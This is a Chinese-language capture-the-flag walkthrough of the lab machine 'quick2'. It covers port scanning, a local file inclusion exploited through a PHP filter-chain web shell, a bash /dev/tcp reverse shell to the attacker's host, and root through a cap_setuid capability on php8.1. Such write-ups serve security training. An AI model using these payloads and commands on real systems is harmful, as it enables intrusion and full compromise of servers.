# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-11 09:57 EDT
Nmap scan report for quick2 (192.168.2.12)
Host is up (0.00022s latency).
MAC Address: 08:00:27:F8:CC:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.48 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.12
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-11 09:59 EDT
Nmap scan report for quick2 (192.168.2.12)
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 08:00:27:F8:CC:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
```

# 漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.2.12
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                     
 (_||| _) (/_(_|| (_| )                                              
                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.2.12/_26-04-11_10-02-15.txt

Target: http://192.168.2.12/

[10:02:15] Starting:                                                 
[10:02:16] 403 -  277B  - /.ht_wsr.txt
[10:02:16] 403 -  277B  - /.htaccess.bak1
[10:02:16] 403 -  277B  - /.htaccess.sample
[10:02:16] 403 -  277B  - /.htaccess.orig
[10:02:16] 403 -  277B  - /.htaccess.save
[10:02:16] 403 -  277B  - /.htaccess_extra
[10:02:16] 403 -  277B  - /.htaccess_sc
[10:02:16] 403 -  277B  - /.htaccess_orig
[10:02:16] 403 -  277B  - /.htaccessBAK
[10:02:16] 403 -  277B  - /.htaccessOLD2
[10:02:16] 403 -  277B  - /.htaccessOLD
[10:02:16] 403 -  277B  - /.htm
[10:02:16] 403 -  277B  - /.html
[10:02:16] 403 -  277B  - /.htpasswd_test
[10:02:16] 403 -  277B  - /.htpasswds
[10:02:16] 403 -  277B  - /.httr-oauth
[10:02:16] 403 -  277B  - /.php
[10:02:18] 200 -  771B  - /about.php
[10:02:24] 200 -  616B  - /contact.php
[10:02:26] 200 -  163B  - /file.php
[10:02:27] 200 -    1KB - /home.php
[10:02:28] 301 -  313B  - /images  ->  http://192.168.2.12/images/
[10:02:28] 200 -  630B  - /images/
[10:02:31] 200 -  359B  - /news.php
[10:02:36] 403 -  277B  - /server-status/
[10:02:36] 403 -  277B  - /server-status

Task Completed
```

看一下file.php页面

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.12/file.php                            
<html>
<body>

<h2>Local File Inclusion Vulnerability</h2>

<form method="get" action="/file.php">
  File to include: <input type="text" name="file">
  <input type="submit">
</form>


</body>
</html>
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.12/file.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
<html>
<body>

<h2>Local File Inclusion Vulnerability</h2>

<form method="get" action="/file.php">
  File to include: <input type="text" name="file">
  <input type="submit">
</form>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash

</body>
</html>
┌──(kali㉿kali)-[~]
└─$ python3 lfimap/lfimap.py -U "http://192.168.2.12/file.php?file=PWN" -a 

[i] Testing GET 'file' parameter...
[+] LFI -> 'http://192.168.2.12/file.php?file=php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd'
[+] LFI -> 'http://192.168.2.12/file.php?file=file%3A%2F%2F%2Fetc%2Fpasswd'
[+] LFI -> 'http://192.168.2.12/file.php?file=/etc/passwd'

----------------------------------------
LFImap finished with execution.
Parameters tested: 1
Requests sent: 26
Vulnerabilities found: 3
```

存在文件包含漏洞

```
┌──(kali㉿kali)-[~]
└─$ python3 lfimap/lfimap.py -U "http://192.168.2.12/file.php?file=PWN" -a -x --lhost 192.168.2.15 --lport 4444

[i] Testing GET 'file' parameter...
[+] LFI -> 'http://192.168.2.12/file.php?file=php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd'
[+] LFI -> 'http://192.168.2.12/file.php?file=file%3A%2F%2F%2Fetc%2Fpasswd'
[+] LFI -> 'http://192.168.2.12/file.php?file=/etc/passwd'
[?] Checking if bash is available on the target system...
[i] Enumerating file system to discover access log location...
                                       [?] Checking if netcat is available on the target system...
[i] Enumerating file system to discover access log location...
                                       [?] Checking if php is available on the target system...
[i] Enumerating file system to discover access log location...
                                       [?] Checking if perl is available on the target system...
[i] Enumerating file system to discover access log location...
                                       [.] Checking if telnet is available on the target system...
[i] Enumerating file system to discover access log location...
                                           
----------------------------------------
LFImap finished with execution.
Parameters tested: 1
Requests sent: 153
Vulnerabilities found: 3
```

没有成功，利用php_filter_chain_generator

```
┌──(kali㉿kali)-[~]
└─$ python3 lfimap/php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

http://192.168.2.12/file.php?file=xxx&cmd=id
```
尝试反弹一个shell

```
http://192.168.2.12/file.php?file=xxxx&cmd=%2fbin%2fbash+-c+%22%2fbin%2fbash+-i+%3E%26+%2fdev%2ftcp%2f192.168.2.15%2f4444+0%3E%261%22

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.12] 48908
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
www-data@quick2:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
www-data@quick2:/var/www/html$ ls -la
ls -la
total 56
drwxr-xr-x 3 root     root     4096 Jan 29  2024 .
drwxr-xr-x 3 root     root     4096 Jan 12  2024 ..
-rw-r--r-- 1 andrew   andrew   1446 Nov 27  2023 about.php
-rw-r--r-- 1 andrew   andrew   1502 Dec  4  2023 cars.php
-rw-r--r-- 1 andrew   andrew    254 Nov 24  2023 connect.php
-rw-r--r-- 1 andrew   andrew   1395 Nov 27  2023 contact.php
-rw-r--r-- 1 www-data www-data  290 Jan 12  2024 file.php
-rw-r--r-- 1 andrew   andrew   2539 Jan 14  2024 home.php
drwxr-xr-x 2 andrew   andrew   4096 Dec  4  2023 images
-rw-r--r-- 1 andrew   andrew   1537 Jan 29  2024 index.php
-rw-r--r-- 1 andrew   andrew    853 Jan 13  2024 maintenance_and_repair.php
-rw-r--r-- 1 root     root      560 Jan 14  2024 news.php
-rw-r--r-- 1 andrew   andrew    593 Nov 24  2023 send_email.php
-rw-r--r-- 1 andrew   andrew   4038 Dec  4  2023 styles.css
www-data@quick2:/var/www/html$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
www-data@quick2:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/snap/core20/1405/usr/bin/chfn
/snap/core20/1405/usr/bin/chsh
/snap/core20/1405/usr/bin/gpasswd
/snap/core20/1405/usr/bin/mount
/snap/core20/1405/usr/bin/newgrp
/snap/core20/1405/usr/bin/passwd
/snap/core20/1405/usr/bin/su
/snap/core20/1405/usr/bin/sudo
/snap/core20/1405/usr/bin/umount
/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1405/usr/lib/openssh/ssh-keysign
/snap/snapd/20671/usr/lib/snapd/snap-confine
//PHP被赋予了“改UID能力”
www-data@quick2:/var/www/html$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
//capability cap_setuid=ep的含义：允许进程调用setuid(0)
/usr/bin/php8.1 cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core20/1405/usr/bin/ping cap_net_raw=ep
www-data@quick2:/var/www/html$ php8.1 -r 'posix_setuid(0); system("/bin/bash");'
<$ php8.1 -r 'posix_setuid(0); system("/bin/bash");'
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
